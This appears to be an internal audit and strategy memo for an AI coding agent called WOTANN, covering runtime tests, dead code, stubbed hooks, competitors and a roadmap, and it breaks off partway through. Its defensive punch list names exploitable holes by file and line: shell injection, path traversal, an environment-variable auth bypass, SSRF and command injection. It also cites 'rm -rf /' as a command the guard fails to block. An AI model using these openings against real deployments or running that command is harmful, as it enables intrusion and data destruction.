# WOTANN Master Audit — April 14, 2026

> Cross-session reference document consolidating 4 rounds of exhaustive audits, 25+ subagent deep-dives, live runtime testing, 31 desktop screenshots, 862-file hermes catalogue, 357K-star OpenClaw re-audit, 7 v4 research agents covering app builders / Google stack / Anthropic roadmap / editor patterns / tiny-model fallback / UI-UX synergy / cost optimization / TurboQuant feasibility.

> **File purpose**: durable strategic reference. Cite this in future sessions as the single source of truth.

---

## Table of Contents

1. [The Five Hard Truths](#1-the-five-hard-truths)
2. [Runtime Verification Results](#2-runtime-verification-results)
3. [Subsystem Truth Table](#3-subsystem-truth-table)
4. [Ship-Blocker Punch List (19 Critical)](#4-ship-blocker-punch-list)
5. [Dead Code Inventory (~4,500 LOC)](#5-dead-code-inventory)
6. [Fake Guarantees Catalogue](#6-fake-guarantees-catalogue)
7. [The 153 RPC Handler Map](#7-the-153-rpc-handler-map)
8. [Competitive Landscape — Verified](#8-competitive-landscape)
9. [Anthropic Timeline Race (60-90 day window)](#9-anthropic-timeline-race)
10. [Tool Serialization Bug (THE bug)](#10-tool-serialization-bug)
11. [OpenClaw — Existential Threat Analysis](#11-openclaw-existential-threat)
12. [Hermes-Agent — 30 Patterns to Steal](#12-hermes-patterns-to-steal)
13. [OpenCode + oh-my-pi — Patterns to Port](#13-opencode-ohmypi)
14. [Tiny-Model Capability Ladder (1B-3B)](#14-tiny-model-capability)
15. [App Builder Strategy (Lovable/Bolt/v0/Replit)](#15-app-builder-strategy)
16. [Google Stack — The Gemini Opportunity](#16-google-stack)
17. [Editor Redesign Blueprint](#17-editor-redesign)
18. [UI/UX Synergy — 5-Tab Navigation](#18-ui-ux-synergy)
19. [Cost Optimization — 82% Savings Possible](#19-cost-optimization)
20. [TurboQuant Feasibility + Port Plan](#20-turboquant-feasibility)
21. [Strategic Pivot + Release Roadmap](#21-strategic-pivot)
22. [The 250+ Item Master Punch List](#22-master-punch-list)

---

## 1. The Five Hard Truths

1. **WOTANN is substantial but not yet a product.** 412 TS files, 144K LOC, 3,659/3,660 tests pass, 81ms cold start, 0 unsafe Rust, 9 `any` uses, Seatbelt sandbox real. But autonomous mode fails end-to-end (live-verified ECANCELED), tool serialization dead in 4/5 adapters (live fetch-verified), 10 of 23 hooks are fake guarantees, 10 of 86 skills silently drop, ~12 of 26 desktop views don't resolve.

2. **The harness-amplifies-every-model thesis is unfulfilled but fixable.** Only Ollama actually receives `tools:` in the request body. Anthropic/Codex/Copilot/openai-compat adapters strip it. One ~30-line fix per adapter unlocks the core pitch. Reference: hermes `convert_tools_to_anthropic` at `agent/anthropic_adapter.py:779-791`.

3. **OpenClaw (357K⭐) is the biggest existential threat.** Ships 53 CLI-wrapper skills + 3 native apps (macOS/iOS/Android + Watch) + real lancedb vector store + working active-memory blocking sub-agent + 3-phase dreaming cron + 28-hook engine + 25+ channel adapters + ClawHub registry. WOTANN's "vector store" is self-admitted hashed TF-IDF. Only OpenClaw's terminal-first onboarding is the current moat; that window closes when they polish it.

4. **Anthropic's `Claude Apps` leak (April 12, 2026) sets a 60-90 day timeline race.** "Let's ship something great" full-stack builder screenshots show Security/Database/Storage/Authentication/Users/Secrets/Logs panels + Recipes + embedded browser preview + one-click deploy. GA realistic June-September 2026. Claude Managed Agents already public beta. KAIROS autonomous daemon leaked with /dream skill. Window: **60-90 days** for WOTANN to ship public MVP before narrative anchors on Claude Apps.

5. **WOTANN's only genuine moat is multi-provider routing + iOS + bundled local model + free-tier-first.** OpenClaw is Anthropic-curious but single-model-per-session. Cursor/Windsurf/Claude Code are desktop-only. Anthropic structurally cannot ship iOS-native Swift app generation. Bundled Gemma + free tier is a privacy niche Devin/Factory/Copilot Workspace cannot match.

---

## 2. Runtime Verification Results

| Test | Result | Evidence |
|---|---|---|
| `npm test` | ✅ 3,659 pass + 1 skip | Live vitest run, 49.89s |
| `npm run typecheck` | ✅ exit 0 | Clean tsc |
| `npm run build` | ✅ exit 0 | `dist/index.js` built |
| `npm run lint` | ⚠️ **Silent no-op** | ESLint 9 requires `eslint.config.js`, project has `.eslintrc.json` |
| Desktop typecheck | ✅ exit 0 | Ubuntu CI + local |
| `node dist/index.js --version` | ✅ 81ms | Measured |
| `node dist/index.js doctor` | ✅ 206ms | 3 providers detected |
| `node dist/index.js providers` | ✅ 204ms | 18 providers listed, 3 active |
| `node dist/index.js skills list` | ⚠️ **76 of 86** | 10 silent drops (no frontmatter) |
| Ollama query via `wotann run --raw` | ✅ 28.5s | Returned "OK" correctly |
| Autonomous mode `wotann autonomous edit-file` | ❌ ECANCELED | File unchanged; `node:fs:732 Error: ECANCELED: operation canceled, read` at ESM load |
| Desktop app launch `open -a WOTANN` | ✅ renders | 31 screenshots captured |
| Views reachable from palette | ⚠️ ~7 of ~26 | Polished: Chat/Editor/Workshop/Exploit/Settings/Memory/Cost. Unreachable: Canvas/Council/Trust/Proofs/Integrations/Computer Use/Design/Dispatch/Approvals/Plugins/Schedule/Intelligence |
| Anthropic live fetch body capture | ❌ No `tools:` | Keys: `["model","max_tokens","messages","stream"]` |
| OpenAI-compat live fetch | ❌ No `tools:` | Keys: `["model","messages","max_tokens","temperature","stream"]` |
| Ollama live fetch (control) | ✅ `tools:` present | Proves methodology |
| MemoryStore init + FTS5 search | ✅ 7.44ms init + 0.18ms query | 21 tables, BM25-scored |
| ObservationExtractor | ✅ 5 observations from 3 captures | `observation-extractor.ts` works |

---

## 3. Subsystem Truth Table

| Subsystem | Claimed | Real | Evidence |
|---|---|---|---|
| Providers | 17-18 | 17 enum values ✓ | `src/core/types.ts` |
| Middleware layers | 26 | **25 registered** (5 advisory-only) | `pipeline.ts:86-115` |
| Intelligence modules | 42 | **30 wired**, 7 dead, 5 skeletons | File-by-file audit |
| Orchestration patterns | 29 | **11 wired**, 10 half-built, 5 dead | Import graph |
| Memory layers | 8 | **5.5 real** (recall=nominal, proactive=5 regex rules) | store.ts + 24 files |
| Hook events | 19 | 19 ✓ | types.ts:137-156 |
| Hooks registered | 17+ | 23 registered, **10 fake guarantees** | built-in.ts |
| Skills | 86 | **76 load** (10 silent drops) | runtime `skills list` |
| CLI commands | 78 | 78 ✓ | grep index.ts |
| Channels | 15-16 | 16 present, 10 real + 7 stub/partial | `src/channels/*.ts` |
| RPC handlers | ~100 | **153** (10 pure stubs, 15+ unreachable) | kairos-rpc.ts catalogue |
| Computer Use "4-layer" | surfaced | **Zero UI**, 16 routes not 40, Hi-DPI broken | 31 screenshots + code |
| `wotann autopilot` | yes | **Does not exist** (only `autonomous`) | grep index.ts |
| `wotann relay/workshop/build/compare/review/schedule` | yes | **None exist** | grep |
| TerminalBench "+15-25%" | yes | **No scoring runner** | grep whole repo |
| 1M context | yes | Hardcoded in limits.ts, never runtime-probed | limits.ts:54-469 |
| Tool serialization | universal | **Dead in 4/5 adapters** | Live fetch capture |
| Autonomous mode | works | **Broken** (ECANCELED) | Live test with Ollama |
| 20+ themes | yes | `src/ui/themes/` is **empty** | ls |
| Vector store | real embeddings | **Hashed TF-IDF** (DJB2, 512-dim) | vector-store.ts:1-20 self-admits |
| `turboquant.ts` | real TurboQuant | **381 LOC marketing lie** — passes Ollama q4_0 flags | turboquant.ts inspection |
| ECDH iOS↔daemon | secure | **Broken** (x25519 vs P-256 + field name mismatch) | Source inspection |
| Rust code quality | — | 0 unsafe, 3 safe unwraps | `grep unsafe` |
| TypeScript discipline | — | 9 `any` uses, 0 `@ts-ignore`, 0 empty catches | `grep` |
| Empty catches claim "643" | — | **0** (prior audit claim was wrong) | Multiline grep |

---

## 4. Ship-Blocker Punch List

### 🔴 CRITICAL — must fix before v0.2.0 (19 items)

| # | Issue | File:line | Fix | Effort |
|---|---|---|---|---|
| 0 | **Leaked Supabase creds on public GitHub** | `CREDENTIALS_NEEDED.md:10-11` | `git rm`, rotate key, force-push | 30 min |
| 1 | **Tool serialization dead in 4/5 adapters** | `anthropic-adapter.ts:126-132` +3 | Port hermes `convert_tools_to_anthropic` | 3h × 4 |
| 2 | **ECDH iOS↔daemon broken (curve + field)** | `kairos-rpc.ts:4124` vs `ECDHManager.swift:46` | Standardize x25519, fix field name, refuse plaintext | 2h |
| 3 | **Autonomous mode fails with ECANCELED** | runtime-verified | Deep debug required | ? |
| 4 | **Shell injection in voice TTS** | `voice-mode.ts:509` | Replace `execFileSync("sh","-c",…)` with stdin pipe | 1h |
| 5 | **`composer.apply` unrestricted path write** | `kairos-rpc.ts:3020-3050` | Enforce workspace prefix | 1h |
| 6 | **`wotann ci <task>` fake success stub** | `index.ts:2958` | Actually run command | 1h |
| 7 | **Lint silently no-ops** | `.eslintrc.json` | Migrate to `eslint.config.js` | 30 min |
| 8 | **10 skills silently fail registration** | `skills/{a2ui,canvas-mode,batch-processing,computer-use,cost-intelligence,lsp-operations,mcp-marketplace,benchmark-engineering,prompt-testing,self-healing}.md` | Add YAML frontmatter | 30 min |
| 9 | **10 hooks return fake guarantees** | `hooks/built-in.ts:151,170,186,227,286,303,44,361,531,728` | Implement or demote | 2h |
| 10 | **`WOTANN_AUTH_BYPASS=1` disables ALL RPC auth** | `kairos-ipc.ts:121-139` | Gate behind `NODE_ENV==="test"` | 30 min |
| 11 | **SSRF via DNS rebinding + redirects** | `web-fetch.ts:153-170,257-264` | `dns.lookup()` + manual redirect validate | 2h |
| 12 | **`config.set` writes API keys at 0o644 world-readable** | `kairos-rpc.ts:1899` | `{mode:0o600}` + post-chmod | 30 min |
| 13 | **iOS TaskMonitorHandler has no executeTask callback** | `companion-server.ts:606` | Wire callback — every iOS autonomous task stuck forever | 2h |
| 14 | **iOS MobileVoiceHandler returns synthetic fake** | `ios-app.ts:310-351` | Await real transcription | 1h |
| 15 | **`conversation-manager.ts` + `project-manager.ts` lie about persistence** | `desktop/*` | Add fs writes OR remove docstring claims | 2h |
| 16 | **`mode.set` stub** | `kairos-rpc.ts:2214` | Call `runtime.setMode()` | 30 min |
| 17 | **`memory.verify` always returns verified:true** | `kairos-rpc.ts:2876` | Actually check model output | 1h |
| 18 | **`cost.arbitrage` hardcoded fake prices + `autonomous.run` is system-prompt prefix only** | `kairos-rpc.ts:2170, 2708` | Wire real executor | 2h |
| 19 | **`session.resume` path traversal** | `kairos-rpc.ts:2742` | Validate sessionId | 30 min |

**Total critical effort: ~25-30 hours**

---

## 5. Dead Code Inventory

### Files to delete (~4,500 LOC total)

**Channels (2,497 LOC)**:
- `src/channels/adapter.ts` (189) — WebChatAdapter/DMPairingManager/NodeRegistry shadowed by live impls
- `src/channels/supabase-relay.ts` (677) — zero imports (real is `desktop/supabase-relay.ts`)
- `src/channels/knowledge-connectors.ts` (1,009) — only test imports; `src/connectors/*.ts` is live

**Orchestration (dead/duplicate)**:
- `src/orchestration/issue-to-pr.ts` (188) — zero importers
- `src/orchestration/agent-protocol.ts` — lib.ts re-export only
- `src/orchestration/agent-graph-gen.ts` — never constructed
- `src/autopilot/never-stop.ts` (629) — `@deprecated`, still in lib.ts
- `src/orchestration/proof-bundles.ts` — miscategorized (not orchestration)

**Intelligence (dead/duplicate)**:
- `src/intelligence/auto-mode.ts` — duplicate of `auto-mode-detector.ts`
- `src/intelligence/non-interactive.ts` — duplicate of middleware version
- `src/intelligence/rd-agent.ts` — instantiated never invoked
- `src/intelligence/video-processor.ts` — instantiated never invoked
- `src/intelligence/benchmark-harness.ts` — `simulateTestExecution` returns placeholder
- `src/intelligence/auto-verify.ts` — superseded by verification-cascade
- `src/intelligence/auto-mode-detector.ts` — orphaned
- `src/intelligence/user-model.ts` — 195-line back-compat shim

**Memory (dead/duplicate)**:
- `src/memory/memvid-backend.ts` — zero imports (misleading name, JSON backend not video)
- `src/memory/memory-tools.ts` — MemoryToolkit never instantiated
- `src/memory/unified-knowledge.ts` — UnifiedKnowledgeFabric never built
- `src/memory/pluggable-provider.ts` — registry stays empty
- `src/memory/context-tree-files.ts` — ContextTreeManager never called
- `src/memory/freshness-decay.ts` — consumer is dead MemoryToolkit
- `src/memory/contradiction-detector.ts` — 3 duplicate impls exist; consumer dead
- `src/memory/temporal-memory.ts` — orphan (real bi-temporal in graph-rag.ts)

**Context (dead/Ollama-only facade)**:
- `src/context/maximizer.ts` (398)
- `src/context/context-replay.ts` (276)
- `src/context/context-sharding.ts` (454)
- `src/context/turboquant.ts` (381) — **MARKETING LIE** (just passes Ollama q4_0 flags, not real TurboQuant)
- `src/context/inspector.ts` (237)

**Browser (no real automation)**:
- `src/browser/camoufox-backend.ts` (369) — fake persistence
- `src/browser/chrome-bridge.ts` (498) — CDP WS never established

**Sandbox (never constructed)**:
- `src/sandbox/docker-backend.ts` (633)
- `src/sandbox/terminal-backends.ts` (640)

**Telemetry (facades)**:
- `src/telemetry/provider-cost-dashboard.ts` (276)
- `src/telemetry/benchmarks.ts` (235)
- `src/telemetry/session-replay.ts` (229) — recorder with no producer
- `src/telemetry/token-persistence.ts` (149)

**Marketplace (vaporware)**:
- `src/marketplace/mcp-marketplace.ts` (274) — hardcoded 5 entries + fake `registry.wotann.com` URL

**Voice**:
- `src/voice/edge-tts-backend.ts` (169) — zero callers

**Desktop duplicate**:
- `desktop-app/src/components/autonomous/ProofViewer.tsx` — duplicate of `components/proof/ProofViewer.tsx`

### Repository cleanup (not LOC but clutter)

- 4 stale xcodeproj: `ios/WOTANN [3-6].xcodeproj` (480 KB Finder dupes)
- `desktop-app/postcss.config 2.mjs`
- 2 `desktop-app/src-tauri/gen/schemas/desktop-schema [2-3].json`
- 6 `.DS_Store` files
- 12 top-level research MDs to archive in `docs/archive/`
- 7 empty test directories (`tests/unit/{core,providers,sandbox}`, `tests/eval`, `desktop-app/tests`, `desktop-app/src/components/conversations`, `src/ui/themes`)
- Nested `.wotann/.wotann/` runtime bug
- Zero-byte `desktop-app/src-tauri/binaries/whisper-aarch64-apple-darwin` shipping to users

---

## 6. Fake Guarantees Catalogue

Hooks claimed as "guarantees" in `hooks/built-in.ts` that return advisory strings instead of enforcing:

| Hook | L# | Claims | Actual |
|---|---|---|---|
| `preCompactFlush` | 151 | Flush WAL to durable memory | Returns `"WAL flush: ..."` — no flush |
| `sessionSummary` | 170 | Auto-summarize on stop | Returns message, no summarize |
| `memoryRecovery` | 186 | Reload memory on SessionStart | Returns message, no reload |
| `autoLint` | 361 | Run linter after Write/Edit | Only prints reminder |
| `simpleCorrectionCapture` | 531 | "Queued for learning system" | No queue write |
| `correctionCapture` | 227 | Queue correction | Only `"warn"` return |
| `completionVerifier` | 286 | "blocks stop without evidence" | Returns `"warn"`, does not block |
| `tddEnforcement` | 303 | "blocks impl before tests exist" | Returns `"warn"`, does not block |
| `destructiveGuard` | 44 | Block dangerous commands | **Returns "warn" even for `rm -rf /`** |
| `focusModeToggle` | 728 | Toggle UI focus | State only; UI must poll manually |

---

## 7. The 153 RPC Handler Map

See `engram://audits/wotann-kairos-rpc-and-ohmypi` for the full 153-row catalogue. Summary:

### Top 10 pure stubs
1. `cron.list` (L2400) — `return { jobs: [] }`
2. `cost.arbitrage` (L2170) — hardcoded fake prices
3. `mode.set` (L2214) — never calls runtime.setMode; iOS UI non-functional
4. `channels.start` (L2819) — reads health, never starts
5. `channels.stop` (L2830) — returns `stopped:true` always
6. `memory.verify` (L2876) — always returns `verified:true`
7. `context.info` sources (L2222) — always `[]`
8. `continuity.frame` (L4154) — ring buffer then discards
9. `autonomous.run` (L2708) — just system-prompt prefix, never invokes executor
10. `session.create` (L2483) — fake ID, no persistence

### Top 15 zero-caller handlers (unreachable dead code)
`cron.list`, `connectors.save_config`, `connectors.test`, `channels.policy.list/add/remove`, `action.check/pending`, `agents.hierarchy`, `agents.workspace`, `memory.mine`, `prompts.adaptive`, `benchmark.history/best`, `search.parallel`, `train.extract`, `training.extract`, `skills.merge`, `meet.summarize`, `config.sync`, `triggers.load`

### Top 10 security issues beyond the documented 4
- `session.resume` path traversal
- `agents.submit` caller-controlled workingDir
- `mcp.add` stored command+args spawned later (persistent command injection)
- `providers.saveCredential` plaintext wotann.yaml
- `repo.map` raw root scan
- `git.*` path→runGit cwd with fsmonitor RCE vector
- `lsp.rename` rewrites any file LSP finds (no workspace boundary)
- `continuity.photo` unbounded base64 written to disk
- `auth.import-codex` raw path to readFileSync
- `triggers.load` caller-controlled configPath

---

## 8. Competitive Landscape

| Competitor | Scale | Threat | Key pattern WOTANN needs |
|---|---|---|---|
| **OpenClaw** | 357K⭐ MIT | **Existential** — 53 CLI skills + 3 native apps + real memory + ACP bridge + Standing Orders | Port 10 S-tier patterns (~3,800 TS LOC) |
| **Claude Code** | Anthropic, 9000+ plugins | Direct + rate-limit crisis Q1 2026 | Claude skill spec compat |
| **Claude Apps** (leaked Apr 12) | Coming GA Jun-Sep 2026 | **Timeline race 60-90 days** | Ship builder MVP before public beta |
| **Cursor** | 1M+ users Electron | Editor moat | Tab autocomplete patterns |
| **Windsurf** | 4000 enterprises SWE-1.5 | Biggest direct | Cascade Memories + Flow awareness |
| **OpenCode** | 143K⭐ daily releases | De-facto OSS Claude Code | 30+ pre-wired LSPs, Claude Pro OAuth |
| **claw-code** | 184K⭐ (+72K) unlicensed | Legal risk | Parity matrix discipline (structural only) |
| **superpowers** | 152K⭐ MIT | Distribution | Multi-harness skill packaging (4× reach) |
| **hermes-agent** | NousResearch 862 files | Technical peer | 11 open-model parsers + HRR memory + shadow-git |
| **oh-my-pi** | 3K⭐ MIT | Patterns | 2-char CID hashline + vendored brush + 53 LSP servers |
| **Lovable/Bolt/v0/Replit Agent** | Commercial | Builder category | 20 UX patterns (Visual Edits, Checkpoints, Chat Mode split, etc.) |
| **Google Antigravity** | Nov 2025 | IDE+agent | Manager Surface, Browser Sub-Agent, `.gemini/antigravity/brain/` |
| **LM Studio** | Proprietary | UX reference | Discover tab gold standard |
| **LobeChat** | 57K⭐ MIT | UX reference | Topic Tree branching |
| **Jules** (Google) | Async | Parallel threat | Environment Snapshots, Audio changelogs |

---

## 9. Anthropic Timeline Race

**Claude Apps leaked April 12, 2026** ("Let's ship something great"):
- Screenshots show Security/Database/Storage/Authentication/Users/Secrets/Logs panels
- Recipes library (sign-in setup, DB connection, security scanning, dark mode templates)
- Embedded browser with live preview during generation
- One-click deploy button
- Demo output: landing pages, AI chatbots, photo albums, Space Invaders
- Distinct from Claude Code — positioned for non-coders (vibe coders)

**Claude Managed Agents** (public beta April 8, 2026):
- `/v1/agents`, `/v1/environments`, `/v1/sessions`
- $0.08/session-hour + tokens + $10/1k web searches
- Sonnet 4.6 default, Opus 4.6 supported
- Sandboxed cloud container, checkpointed state, SSE streaming

**Claude Code source leak** (March 31, 2026) exposed 44 feature flags, 20+ unreleased:
- **KAIROS** (150+ references): always-on autonomous daemon with `<tick>` loop, `SleepTool`, `/dream` nightly distillation, GitHub webhooks, push notifications
- **ULTRAPLAN**: remote cloud planning on Opus 4.6, 30-min thinking windows
- **BUDDY**: 18-species Tamagotchi pet (teaser Apr 1-7 validated May 2026 launch)
- **Coordinator Mode**: hierarchical multi-agent with shared team memory
- **autoDream**: nightly memory consolidation ≤200 lines / 25KB

**GA windows**:
- Claude Apps public beta: **June-July 2026** (aggressive) / Aug-Sep (measured)
- Claude Apps GA: **September-December 2026**
- KAIROS GA: **May-August 2026**

**WOTANN window**: ship runnable public MVP before **June 2026**. Visibility before public beta > feature completeness after.

### What Anthropic structurally CANNOT match
1. Multi-provider routing (Claude Apps = Anthropic-only forever)
2. Offline / free-tier-first (bundled Gemma = zero cost)
3. iOS-native Swift/SwiftUI app generation (Anthropic is web/desktop-first)
4. Self-hosted / export (Anthropic will lock to claude.ai hosting)
5. Privacy / local-first

### What Anthropic WILL outgun WOTANN on
1. Model quality (Opus 4.6)
2. Distribution (100M+ Claude.ai users)
3. Infrastructure (Managed Agents scale)
4. Brand trust (SOC2/HIPAA/FedRAMP)
5. MCP spec authorship

---

## 10. Tool Serialization Bug

**The single most consequential bug.** Verified with live fetch capture:

```
── Anthropic ──
fetch URL: https://api.anthropic.com/v1/messages
fetch body keys: ["model","max_tokens","messages","stream"]
tools present (fetch): false

── OpenAI-compat ──
fetch URL: https://api.openai.com/v1/chat/completions
fetch body keys: ["model","messages","max_tokens","temperature","stream"]
tools present (fetch): false

── Ollama (control) ──
fetch URL: http://localhost:11434/api/chat
fetch body keys: ["model","messages","stream","options","tools"]
tools present (fetch): true
```

**Impact**: Every tool-calling feature dead for Claude/GPT/Copilot/openai-compat (13 providers via openai-compat). Only Ollama works. Breaks the entire "capability equalization" moat.

**Fix**: Port hermes's `convert_tools_to_anthropic` (agent/anthropic_adapter.py:779-791). ~400 TS LOC across 4 adapters.

---

## 11. OpenClaw — Existential Threat

**This is NOT a lifestyle-niche competitor. It's the biggest direct threat.**

### What OpenClaw ships today
- **53 bundled skills** wrapping real CLIs: peekaboo (macOS UI automation), imsg, gog (Gmail/Calendar/Drive), wacli (WhatsApp), sag (TTS), sherpa-onnx-tts, bluebubbles (iMessage v2), camsnap, healthcheck (host hardening), nano-pdf, things-mac, tmux, voice-call (Twilio/Telnyx/Plivo), etc. Each with install automation via brew/npm/go/uv.
- **3 native platform apps** + watchOS + share extension: macOS menubar (100+ Swift files, CanvasManager, CronJobEditor, ExecApprovalsSocket), iOS (20+ subdirs: ScreenRecordService ReplayKit, CameraController, TalkModeManager, RootCanvas), Android Kotlin mirror
- **4 memory plugins** (one active at a time): `memory-core` (SQLite+vector+keyword hybrid), **`active-memory`** (blocking sub-agent runs BEFORE main reply), `memory-lancedb` (real vector store, auto-install runtime), `memory-wiki` (Obsidian vault compiler with claims frontmatter + contradiction detection)
- **Dreaming 3-phase cron**: Light/Deep/REM with 6-signal weighted scoring, Dream Diary subagent narrative, grounded backfill with `--rollback`
- **ACP bridge** (Agent Context Protocol) for Zed/Neovim IDE embedding: stdio NDJSON, Initialize/NewSession/Prompt/Cancel
- **Live Canvas + A2UI** (JSONL v0.8 UI protocol): agent generates UI, renders on phone via `webkit.messageHandlers.openclawCanvasA2UIAction.postMessage(...)`
- **Voice Wake + Talk Mode**: gateway-owned wake words, Listen→Thinking→Speaking overlay, interrupt-on-speech, JSON voice directives
- **Task Flow + Lobster DSL**: durable orchestration with typed pipelines + resumable approval gates (`resumeToken`)
- **28-hook engine** with 11 event types (`command:new`, `session:compact:before/after`, `agent:bootstrap`, `gateway:startup`, `message:received`, `message:transcribed`, etc.) + directory HOOK.md/handler.ts discovery
- **Standing Orders**: permanent operating authority with Scope, Triggers, Approval gates, Escalation rules
- **25+ channel adapters** sharing `issuePairingChallenge` helper, 8-char no-ambiguous-char codes (1hr TTL, 3-pending cap), setup-code base64 bootstrap token, conversation-binding-context
- **ClawHub registry**: publish/install/update flows, moderation (≥1-week GitHub account to publish, 3-report auto-hide, 20-reports-per-user cap), embeddings search, content-hash diff, `.clawhub/lock.json`
- **35+ model providers** including tencent plugin `@tencent-weixin/openclaw-weixin`
- **Multi-agent routing**: one Mac runs `main`+`family` (restricted sandbox=all read-only)+`delegate`+`work` simultaneously with separate workspaces, OAuth, USER.md, SOUL.md per agent
- **Tailscale Serve/Funnel auto-config** for gateway exposure
- **Exec approval UX**: local Unix socket → Swift app → approve/deny (more polished than anything in OSS space)

### The strategic truth
- OpenClaw has a **5-10 year quality/ecosystem head start**
- Only weakness: terminal-first onboarding
- That window closes the moment they polish it
- "OpenClaw has escaped the desktop. Tabs are a desktop frame. OpenClaw sits in the phone's notification stack, Mac's menubar, every chat channel"

### Top 10 S-tier patterns to port (~3,800 LOC total)
1. **Active-memory blocking sub-agent** (400 LOC) — runs BEFORE main reply; queryMode/promptStyle/timeoutMs config
2. **8-file bootstrap injection** into prompt assembly every turn (250 LOC)
3. **Automatic memory flush before compaction** (silent turn) (150 LOC)
4. **`/elevated on|ask|full|off` session-scoped directive** (200 LOC)
5. **`sessions_spawn` non-blocking with announce-on-completion** (500 LOC)
6. **lancedb auto-install runtime** — replace `vector-store.ts` TF-IDF (400 LOC)
7. **Peekaboo-equivalent macOS native CLI** (or bind to peekaboo directly) (600 LOC)
8. **Dreaming 3-phase cron with 6-signal scoring** (700 LOC)
9. **Hook engine with 11 event types + directory HOOK.md/handler.ts** (500 LOC)
10. **Standing orders discipline + Execute-Verify-Report** in AGENTS.md (100 LOC)

---

## 12. Hermes-Agent — 30 Patterns to Steal

Hermes-agent by NousResearch: 862 Python files, ~200K LOC. Biggest technical peer.

### TIER 0 — Direct fixes for WOTANN's biggest gaps

1. **All 11 open-model tool_call parsers** (1089 Python LOC → ~900 TS LOC)
   - hermes, mistral, llama, qwen, qwen3_coder, deepseek_v3, deepseek_v3_1, kimi_k2, glm45, glm47, longcat
   - Source: `environments/tool_call_parsers/*.py`
   - **Unlocks every open-weights model on VLLM/SGLang/Ollama/LM Studio**
   - No JS/TS competitor has these parsers
2. **Parser registry with `@register_parser` decorator** (80 TS LOC) — plug-in architecture for new model formats
3. **Holographic VSA (HRR) memory** (250 TS LOC with ndarray)
   - Phase-vector encoding with circular convolution, SHA-256 deterministic atoms, SNR estimation
   - Source: `plugins/memory/holographic/holographic.py:43-203`
   - **No competitor has this — biggest technical moat**
4. **FTS5 + Jaccard + HRR hybrid retrieval** with temporal half-life decay (400 LOC)
   - Source: `plugins/memory/holographic/retrieval.py:22-593`
5. **Shadow-git checkpoint manager** (500 LOC)
   - Source: `tools/checkpoint_manager.py:1-623`
   - Auto-snapshots before every write_file/patch
6. **Programmatic Tool Calling (PTC) via UDS + file RPC** (800 LOC)
   - Source: `tools/code_execution_tool.py:1-1377`
   - Collapse N tool calls into 1 inference turn — 10× speedup

### TIER 1 — High leverage (#7-15)
7. Skills Guard 928-LOC regex + trust-tier policy
8. Tirith pre-exec SHA-256 + cosign verification
9. 8-strategy fuzzy find-and-replace (566 LOC)
10. MCP OAuth 2.1 + PKCE (500 LOC)
11. Skills Hub 3053 LOC with 5 source adapters + quarantine
12. V4A patch format parser (Codex/cline interop)
13. Smart-LLM command approval
14. Context compaction with summary preamble + tail budget
15. FailoverReason error classifier 820 LOC

### TIER 2 — OAuth wins (use user's existing subscriptions)
16. Extend credential-pool to 4 strategies + 1h TTL
17. Copilot OAuth device flow (gho_/github_pat_ support, ghp_ rejection)
18. Codex OAuth via auth.openai.com device flow
19. Qwen OAuth via chat.qwen.ai
20. Anthropic sk-ant-oat + `~/.claude.json` import (use Claude Code login!)

### TIER 3 — Platform + tools
21. Session search via FTS5 + LLM summarization
22. Feishu adapter 3950 LOC (Chinese enterprise market)
23. Subagent delegation with blocked-tool set
24. Insights engine (/insights command)
25. 6 sandbox backends (docker/modal/ssh/singularity/daytona/local)
26. ACP server (Zed/Neovim IDE embedding)
27. Cron scheduler 992 LOC + jobs 762 LOC
28. Skill manager tool (agent creates its own skills)
29. Curses multi-select (pro TUI parity)
30. Mixture-of-Agents (frontier benchmark boost)

---

## 13. OpenCode + oh-my-pi — Additional Patterns

### OpenCode (143K⭐ MIT, daily releases)
1. **30+ pre-wired LSPs** with auto-activation (vs WOTANN's 1 file)
2. **Multi-protocol skills discovery** (`.claude/`, `.agents/`, `.opencode/`) — full Claude Code interop
3. **OAuth into Claude Pro/Max and ChatGPT Plus/Pro** as providers
4. **GitHub Copilot + GitLab Duo OAuth** subscription reuse
5. **MCP OAuth with Dynamic Client Registration** on 401
6. **npm-installable plugins** auto-cached
7. **15+ hook types** across file/session/tool/tui lifecycle
8. **Bun `$` shell API** in every plugin
9. **Zed editor extension**
10. **Slack integration package**
11. **OTLP observability export**
12. **HTTP proxy support** for corporate networks
13. **PDF drag-and-drop** attachment handling
14. **`opencode agent create`** interactive wizard
15. **`.well-known/opencode`** org-default discovery

### oh-my-pi Key patterns (2-char CID is killer)
1. **Replace SHA-256-16 with xxHash32-2-char nibble** — 8× faster, regex-unambiguous
   - Format: `LINENUM#HASH:TEXT` e.g. `5#ZP:function foo()`
   - Nibble alphabet `ZPMQVRWSNKTXJBYH` (no digits to avoid regex collision with line numbers)
2. **6 hashline edit operations**: replace_line, replace_range, append_at, prepend_at, append_file, prepend_file + preflight sanitizers
3. **HashlineMismatchError with remaps map** — grep-style `>>>` output + auto-correct
4. **TTSR (Time Traveling Stream Rules)** — stream-interrupt with abort+50ms-retry and `<system-interrupt>` template
5. **Blob store content-addressed** at `blob:sha256:<hex>` with 1024-byte externalization threshold
6. **Artifact path allocation + OutputSink spill** (50KB in-mem, file for overflow, `artifact://<id>` URL)
7. **Pre-compaction tool-output pruning** (protect newest 40k, require 20k savings)
8. **Bash runtime EMBEDDED** (vendored brush crates, NO subprocess fork)
9. **53 pre-configured LSP servers** with writethrough pattern (every edit routes through diagnostic collection)
10. **Jupyter Kernel Gateway backed Python** with local shared gateway + heartbeat + `application/x-omp-status` events
11. **14 Puppeteer stealth scripts** (tampering/botd/webgl/fonts/audio/locale)
12. **Task isolation backend**: none/worktree/fuse-overlay/fuse-projfs (Windows ProjFS)
13. **Secret obfuscation pipeline**: auto-scan `*_KEY/*_SECRET/*_TOKEN`, deterministic `<<$env:SN>>` placeholders
14. **Autonomous memory extraction**: per-session signals → cross-session consolidation → MEMORY.md + auto-generated skills
15. **Session tree with id/parentId leaves** — non-linear chat history, `/tree` UI filters
16. **AST chunk edit tool** with tree-sitter selectors in 30+ languages
17. **Marketplace plugin installer** — Git-hosted `.claude-plugin/marketplace.json` catalogs
18. **Hardened PTY env defaults** — `PAGER=cat`, `GIT_EDITOR=true`, `GIT_TERMINAL_PROMPT=0`
19. **Process-tree kill** — killTree(pid) with bottom-up traversal

---

## 14. Tiny-Model Capability Ladder (1B-3B Floor)

User chose 1B-3B as the target floor. This is the hardest + biggest moat position.

### Model bundle recommendation
- **Gemma 4 E2B** (2B effective, NATIVE function calling + vision + audio) — unique at this size
- **Gemma 4 E4B** (current default, 8B effective)
